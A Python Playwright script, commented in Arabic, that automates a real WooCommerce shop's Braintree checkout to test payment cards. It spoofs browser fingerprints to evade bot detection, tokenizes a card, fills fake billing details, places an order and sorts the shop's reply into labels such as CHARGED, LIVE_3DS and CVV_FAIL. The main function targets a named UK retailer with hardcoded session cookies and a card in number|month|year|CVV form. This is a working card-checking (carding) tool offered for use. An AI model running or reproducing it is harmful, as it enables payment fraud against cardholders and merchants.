#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
VINEX Braintree 3DS Tester — Playwright Edition v3.0
- بيمشي في الـ flow الطبيعي بالكامل
- بيملأ الفورم ويضغط PLACE ORDER
- بيرجّع الرد الفعلي من الموقع (success / failure / 3ds / declined)
- Turnstile اختياري: لو حلّ نفسه → تمام، لو لأ → نكمل ونشوف رد الموقع
"""
import asyncio, json, re, time, random, uuid, base64, os
from urllib.parse import urlparse
from playwright.async_api import async_playwright


class BraintreeTester:
    def __init__(self, checkout_url, cookies='', headless=False, debug=False):
        self.checkout_url = checkout_url
        p = urlparse(checkout_url)
        self.host = p.netloc
        self.base = f'{p.scheme}://{p.netloc}'
        self.cookies_str = cookies
        self.headless = headless
        self.debug = debug

        # extracted
        self.auth_fp = None
        self.merchant_id = None
        self.woo_nonce = None
        self.bt_config = None
        self.order_total = None
        self.currency = 'GBP'
        self.turnstile_token = None
        self.diagnostics = []

        self._pw = None
        self.browser = None
        self.context = None
        self.page = None

    def _log(self, msg):
        line = f'{time.time():.2f} {msg}'
        self.diagnostics.append(line)
        print(line)

    def _parse_cookies(self):
        out = []
        if not self.cookies_str: return out
        for part in self.cookies_str.split(';'):
            part = part.strip()
            if not part or '=' not in part: continue
            name, _, value = part.partition('=')
            out.append({
                'name': name.strip(),
                'value': value.strip(),
                'domain': self.host,
                'path': '/',
            })
        return out

    # ═══════════════════════════════════════════════════════════
    #  STEP 1: open checkout
    # ═══════════════════════════════════════════════════════════
    async def _open(self):
        self._pw = await async_playwright().start()

        launch_args = [
            '--disable-blink-features=AutomationControlled',
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--disable-gpu',
            '--window-size=540,1170',
        ]
        if self.headless:
            launch_args.append('--headless=new')

        self.browser = await self._pw.chromium.launch(
            headless=self.headless,
            args=launch_args,
        )

        self.context = await self.browser.new_context(
            viewport={'width': 540, 'height': 1170},
            user_agent='Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            locale='en-GB',
            timezone_id='Europe/London',
            extra_http_headers={
                'Accept-Language': 'en-GB,en;q=0.9',
                'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
            },
        )

        await self.context.add_init_script("""
            Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
            window.chrome = { runtime: {} };
            Object.defineProperty(navigator, 'languages', {get: () => ['en-GB','en']});
            Object.defineProperty(navigator, 'plugins', {get: () => [1,2,3,4,5]});
            Object.defineProperty(navigator, 'hardwareConcurrency', {get: () => 8});
            Object.defineProperty(navigator, 'deviceMemory', {get: () => 8});
        """)

        cookies = self._parse_cookies()
        if cookies:
            try:
                await self.context.add_cookies(cookies)
                self._log(f'✅ loaded {len(cookies)} cookies')
            except Exception as e:
                self._log(f'cookie load err: {e}')

        self.page = await self.context.new_page()

        self._log(f'📄 opening {self.checkout_url}')
        await self.page.goto(
            self.checkout_url,
            wait_until='domcontentloaded',
            timeout=60000,
        )
        await self.page.wait_for_timeout(5000)

        # scroll عشان payment form تتحمل
        try:
            await self.page.evaluate('window.scrollBy(0, 800)')
            await self.page.wait_for_timeout(2000)
            await self.page.evaluate('window.scrollTo(0, 0)')
        except: pass

        await self._extract()

    async def _extract(self):
        """استخراج auth_fp + nonce + total من HTML أولاً ثم من JS"""
        try:
            html = await self.page.content()
        except:
            html = ''

        # 1. auth_fp من HTML
        if html:
            m = re.search(r'"authorizationFingerprint"\s*:\s*"([^"]{100,})"', html)
            if m:
                self.auth_fp = m.group(1)
                self._log(f'✅ auth_fp: {self.auth_fp[:60]}...')

            m = re.search(r'"merchantId"\s*:\s*"([a-z0-9]{10,})"', html)
            if m:
                self.merchant_id = m.group(1)
                self._log(f'✅ merchant_id: {self.merchant_id}')

            m = re.search(r'name="braintree_cc_config_data"\s+value="([^"]+)"', html)
            if m:
                from html import unescape
                try:
                    self.bt_config = json.loads(unescape(m.group(1)))
                    self._log('✅ bt_config من HTML')
                except: pass

        # 2. fallback: client_token
        if not self.auth_fp:
            try:
                data = await self.page.evaluate('''
                    () => {
                        if (typeof wc_braintree_client_token !== 'undefined' &&
                            wc_braintree_client_token && wc_braintree_client_token[0]) {
                            return wc_braintree_client_token[0];
                        }
                        const el = document.querySelector('input[name="braintree_cc_config_data"]');
                        if (el && el.value) return '__CONFIG__:' + el.value;
                        return null;
                    }
                ''')
            except: data = None

            if data:
                try:
                    if data.startswith('__CONFIG__:'):
                        cfg = json.loads(data.replace('__CONFIG__:', ''))
                    else:
                        clean = data.strip().replace('\n','').replace('\r','').replace(' ','')
                        clean = re.sub(r'[^A-Za-z0-9+/=]', '', clean)
                        while len(clean) % 4 != 0: clean += '='
                        decoded = base64.b64decode(clean).decode('utf-8', errors='ignore')
                        cfg = json.loads(decoded)
                    self.bt_config = cfg
                    self.auth_fp = cfg.get('authorizationFingerprint')
                    self.merchant_id = cfg.get('merchantId')
                    self._log(f'✅ client_token decoded')
                except Exception as e:
                    self._log(f'decode err: {e}')

        # 3. woo nonce
        try:
            self.woo_nonce = await self.page.evaluate('''
                () => {
                    const el = document.querySelector('input[name="woocommerce-process-checkout-nonce"]');
                    return el ? el.value : null;
                }
            ''')
            self._log(f'✅ woo_nonce: {self.woo_nonce}')
        except: pass

        # 4. order total
        try:
            total = await self.page.evaluate('''
                () => {
                    const el = document.querySelector('.order-total .amount bdi');
                    if (el) return el.textContent.trim();
                    return null;
                }
            ''')
            if total:
                self.order_total = re.sub(r'[^\d.]', '', total)
                self._log(f'✅ order_total: {self.order_total}')
        except: pass

        # 5. Turnstile — بس نبص عليه سريع (لو موجود، بنستخدمه)
        await self._check_turnstile_quick()

    async def _check_turnstile_quick(self):
        """بص سريع على Turnstile — من غير انتظار"""
        try:
            token = await self.page.evaluate('''
                () => {
                    const el = document.querySelector('input[name="cf-turnstile-response"]');
                    if (el && el.value && el.value.length > 20) return el.value;
                    if (window.turnstile && typeof turnstile.getResponse === 'function') {
                        const widgets = document.querySelectorAll('.cf-turnstile');
                        for (let w of widgets) {
                            try {
                                const r = turnstile.getResponse(w);
                                if (r && r.length > 20) return r;
                            } catch(e) {}
                        }
                    }
                    return null;
                }
            ''')
            if token and len(token) > 20:
                self.turnstile_token = token
                self._log(f'✅ turnstile موجود: {token[:30]}...')
            else:
                self._log('⚠️  مفيش turnstile — هنكمل برضه')
        except: pass

    # ═══════════════════════════════════════════════════════════
    #  STEP 2: Charge — يمشي في الـ flow ويجيب الرد
    # ═══════════════════════════════════════════════════════════
    async def Charge(self, card):
        parts = card.strip().split('|')
        if len(parts) < 4: return 'INVALID_FORMAT'
        number = parts[0].replace(' ', '')
        mm = parts[1].zfill(2)
        yy = parts[2]
        if len(yy) == 4: yy = yy[2:]
        cvc = parts[3]

        try:
            await self._open()

            if not self.auth_fp:
                return 'NO_AUTH_FP'
            if not self.woo_nonce:
                return 'NO_WOO_NONCE'

            result = await self._flow(number, mm, yy, cvc)
            return result

        except Exception as e:
            self._log(f'❌ charge err: {e}')
            import traceback
            if self.debug: traceback.print_exc()
            return f'FATAL: {str(e)[:200]}'
        finally:
            try: await self.browser.close()
            except: pass
            try: await self._pw.stop()
            except: pass

    async def _flow(self, number, mm, yy, cvc):
        """
        الـ flow الكامل:
        1) tokenize → nonce
        2) 3DS lookup (بس عشان نعرف enrolled/challenge)
        3) نحط الـ nonce في الفورم + نضغط PLACE ORDER
        4) نقرأ الرد اللي الموقع رجعه
        """

        # ─── 1. tokenize ───
        self._log('🔐 tokenizing...')
        tok_payload = {
            'query': (
                'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {'
                '  tokenizeCreditCard(input: $input) {'
                '    token creditCard { bin brandCode last4 }'
                '  }'
                '}'
            ),
            'variables': {
                'input': {
                    'creditCard': {
                        'number': number,
                        'expirationMonth': mm,
                        'expirationYear': yy,
                        'cvv': cvc,
                        'billingAddress': {
                            'postalCode': 'OX14 4PG',
                            'streetAddress': 'W356',
                        },
                    },
                    'options': {'validate': False},
                }
            },
            'operationName': 'TokenizeCreditCard',
        }

        tok = await self.page.evaluate(
            '''async (args) => {
                const payload = {
                    ...args.payload,
                    clientSdkMetadata: {
                        source: 'client',
                        integration: 'custom',
                        sessionId: crypto.randomUUID(),
                    },
                };
                try {
                    const r = await fetch('https://payments.braintree-api.com/graphql', {
                        method: 'POST',
                        headers: {
                            'Authorization': 'Bearer ' + args.auth_fp,
                            'braintree-version': '2018-05-10',
                            'content-type': 'application/json',
                        },
                        body: JSON.stringify(payload),
                    });
                    return await r.json();
                } catch(e) {
                    return { error: String(e) };
                }
            }''',
            {'payload': tok_payload, 'auth_fp': self.auth_fp},
        )

        if 'errors' in tok:
            return f'TOKENIZE_ERROR: {json.dumps(tok["errors"])[:200]}'

        nonce = tok.get('data', {}).get('tokenizeCreditCard', {}).get('token')
        if not nonce:
            return f'NO_NONCE: {json.dumps(tok)[:200]}'
        self._log(f'✅ nonce: {nonce[:40]}...')

        # ─── 2. 3DS lookup (معلوماتي بس) ───
        self._log('🔍 3DS lookup...')
        bin_num = number[:6]
        amount = self.order_total or '1.00'

        lookup_payload = {
            'amount': amount,
            'browserColorDepth': 24,
            'browserJavaEnabled': False,
            'browserJavascriptEnabled': True,
            'browserLanguage': 'en-GB',
            'browserScreenHeight': 1170,
            'browserScreenWidth': 540,
            'browserTimeZone': -60,
            'deviceChannel': 'Browser',
            'additionalInfo': {
                'billingLine1': 'W356',
                'billingCity': 'London',
                'billingState': '',
                'billingPostalCode': 'OX14 4PG',
                'billingCountryCode': 'GB',
                'billingPhoneNumber': '447700900123',
                'billingGivenName': 'Test',
                'billingSurname': 'User',
                'email': f'test{random.randint(100,999)}@gmail.com',
            },
            'bin': bin_num,
            'dfReferenceId': f'0_{uuid.uuid4()}',
            'clientMetadata': {
                'requestedThreeDSecureVersion': '2',
                'sdkVersion': 'web/3.144.0',
                'cardinalDeviceDataCollectionTimeElapsed': 12,
                'issuerDeviceDataCollectionTimeElapsed': 3610,
                'issuerDeviceDataCollectionResult': True,
            },
            'authorizationFingerprint': self.auth_fp,
            'braintreeLibraryVersion': 'braintree/web/3.144.0',
            '_meta': {
                'merchantAppId': self.host,
                'platform': 'web',
                'sdkVersion': '3.144.0',
                'source': 'client',
                'integration': 'custom',
                'integrationType': 'custom',
                'sessionId': str(uuid.uuid4()),
            },
        }

        lk = await self.page.evaluate(
            '''async (args) => {
                const url = 'https://api.braintreegateway.com/merchants/' +
                    args.merchant_id +
                    '/client_api/v1/payment_methods/' +
                    args.nonce +
                    '/three_d_secure/lookup';
                try {
                    const r = await fetch(url, {
                        method: 'POST',
                        headers: { 'content-type': 'application/json' },
                        body: JSON.stringify(args.payload),
                    });
                    return await r.json();
                } catch(e) {
                    return { error: String(e) };
                }
            }''',
            {'merchant_id': self.merchant_id, 'nonce': nonce, 'payload': lookup_payload},
        )

        enrolled = None
        challenge = None
        version = '?'
        if 'errors' not in lk:
            info = lk.get('threeDSecureInfo', {}) or lk.get('lookup', {}) or lk
            challenge = bool(info.get('challengeRequired'))
            enrolled = info.get('enrolled')
            version = info.get('threeDSecureVersion', '?')
            self._log(f'📋 enrolled={enrolled} challenge={challenge} v={version}')
        else:
            self._log(f'⚠️  lookup err: {json.dumps(lk["errors"])[:150]}')

        # ─── 3. نحط الـ nonce في الفورم (زي المتصفح) ───
        self._log('📝 filling form fields...')
        await self.page.evaluate(
            '''(nonce) => {
                const set_val = (sel, val) => {
                    const el = document.querySelector(sel);
                    if (el) { el.value = val; return true; }
                    return false;
                };
                set_val('#braintree_cc_nonce_key', nonce);
                // device data
                const dev = document.querySelector('#braintree_cc_device_data');
                if (dev) dev.value = JSON.stringify({correlation_id: crypto.randomUUID().slice(0,32)});
                // املأ الفورم بحقول مطلوبة (زي المتصفح)
                const fill = (name, val) => {
                    const el = document.querySelector('input[name="'+name+'"]');
                    if (el && !el.value) el.value = val;
                };
                fill('billing_first_name', 'Test');
                fill('billing_last_name', 'User');
                fill('billing_address_1', 'W356');
                fill('billing_address_2', 'W456');
                fill('billing_city', 'London');
                fill('billing_state', 'W266');
                fill('billing_postcode', 'OX14 4PG');
                fill('billing_phone', '447700900123');
                fill('billing_email', 'test' + Math.floor(Math.random()*1000) + '@gmail.com');
                // terms + gdpr
                const terms = document.querySelector('#terms');
                if (terms) terms.checked = true;
                const gdpr = document.querySelector('#gdpr_woo_consent');
                if (gdpr) gdpr.checked = true;
                return true;
            }''',
            nonce,
        )

        # ─── 4. نضغط PLACE ORDER زي المستخدم ───
        self._log('🖱️  clicking PLACE ORDER...')

        # نضيف listener عشان نلتقط رد الـ checkout
        checkout_response = {}

        async def on_response(resp):
            try:
                if 'wc-ajax=checkout' in resp.url:
                    try:
                        checkout_response['json'] = await resp.json()
                    except:
                        checkout_response['text'] = await resp.text()
                    checkout_response['status'] = resp.status
            except: pass

        self.page.on('response', on_response)

        # نضغط الزرار
        try:
            await self.page.click('#place_order', timeout=10000)
            self._log('   ✅ clicked #place_order')
        except Exception as e:
            self._log(f'   ❌ click failed: {e}')
            # نحاول نعمل submit يدوي
            try:
                await self.page.evaluate('''
                    () => {
                        const form = document.querySelector('form.checkout, form.woocommerce-checkout');
                        if (form) form.submit();
                    }
                ''')
                self._log('   ⚠️  form.submit() called manually')
            except: pass

        # ─── 5. نستنى الرد ───
        self._log('⏳ waiting for checkout response...')
        for _ in range(45):  # 45 ثانية
            if checkout_response.get('json') or checkout_response.get('text'):
                break
            await asyncio.sleep(1)

        # ─── 6. نقرأ الرد ───
        resp_data = checkout_response.get('json')
        resp_text = checkout_response.get('text', '')

        # لو ما فيش رد لسه، نجرب نقرأه من الـ URL / body
        if not resp_data and not resp_text:
            try:
                # لو الصفحة اتغيرت لـ order-received
                current_url = self.page.url
                if 'order-received' in current_url:
                    return f'CHARGED {self.order_total} {self.currency}'

                # نقرأ body
                body = await self.page.evaluate('() => document.body.innerText')
                if 'thank you' in body.lower() or 'order received' in body.lower():
                    return f'CHARGED {self.order_total} {self.currency}'

                # نقرأ رسائل الأخطاء
                err = await self.page.evaluate('''
                    () => {
                        const els = document.querySelectorAll('.woocommerce-error li, .wc-braintree-checkout-error, ul.woocommerce-error');
                        return Array.from(els).map(e => e.textContent.trim()).join(' | ');
                    }
                ''')
                if err:
                    return self._parse_woo_message(err, enrolled, challenge, version)

            except: pass

            return 'NO_RESPONSE (timeout)'

        # ─── 7. نحلل الرد ───
        if resp_data:
            return self._parse_woo_response(resp_data, enrolled, challenge, version)

        # نص HTML
        return self._parse_woo_message(resp_text, enrolled, challenge, version)

    def _parse_woo_response(self, j, enrolled, challenge, version):
        """تحليل JSON من WooCommerce checkout"""
        if not isinstance(j, dict):
            return f'UNKNOWN: {str(j)[:200]}'

        result = j.get('result')
        messages = j.get('messages', '')

        clean = re.sub(r'<[^>]+>', '', str(messages))
        clean = re.sub(r'\s+', ' ', clean).strip()

        if result == 'success':
            # ممكن يكون redirect لـ order-received
            redirect = j.get('redirect', '')
            return f'CHARGED {self.order_total} {self.currency}'

        if result == 'failure':
            return self._parse_woo_message(clean, enrolled, challenge, version)

        if result == 'error':
            return self._parse_woo_message(clean or 'error', enrolled, challenge, version)

        return f'UNKNOWN_RESULT: {result} — {clean[:180]}'

    def _parse_woo_message(self, msg, enrolled, challenge, version):
        """تحليل نص الرد"""
        if not msg:
            return 'UNKNOWN: empty message'
        low = msg.lower()

        # 3D Secure
        if '3d secure' in low or '3ds' in low:
            return f'LIVE_3DS (enrolled={enrolled}, v={version}) — Valid card, OTP required'

        # Turnstile
        if 'verify that you are human' in low or 'turnstile' in low or 'human' in low:
            if challenge:
                return f'LIVE_3DS (enrolled={enrolled}) — Valid card, OTP required'
            return f'CARD_VALID (enrolled={enrolled or "?"}) — Card OK, Turnstile blocked'

        # ردود بنكية
        if 'declined' in low: return f'DECLINED: {msg[:180]}'
        if 'insufficient' in low: return 'INSUFFICIENT_FUNDS'
        if 'cvv' in low: return 'CVV_FAIL'
        if 'expired' in low: return 'EXPIRED'
        if 'do not honor' in low: return 'DO_NOT_HONOR'
        if 'invalid' in low and 'card' in low: return 'INVALID_CARD'
        if 'do not match' in low: return f'AVS_MISMATCH: {msg[:180]}'

        return f'DECLINED: {msg[:180]}'


# ═══════════════════════════════════════════════════════════════
#  Main
# ═══════════════════════════════════════════════════════════════
async def main():
    os.environ.setdefault('DISPLAY', ':99')

    COOKIES = (
        'woocommerce_items_in_cart=1; '
        'wp_woocommerce_session_b89dcd3ac6387311302297d2b2714701=t_4ab0dac325c86a42c210bff77f3a84%7C1794653648%7C1794567248%7Cd995540a42879fe0205c2c3ac47b3f1e; '
        'woocommerce_cart_hash=a7e7aa962b94ba5769367c704cffdffa'
    )

    t = BraintreeTester(
        checkout_url='https://shop.herbs-hands-healing.co.uk/checkout',
        cookies=COOKIES,
        headless=False,
        debug=True,
    )

    print('=' * 60)
    result = await t.Charge('5523427233579293|12|2027|953')
    print('=' * 60)
    print(f'RESULT: {result}')
    print('=' * 60)


if __name__ == '__main__':
    asyncio.run(main())
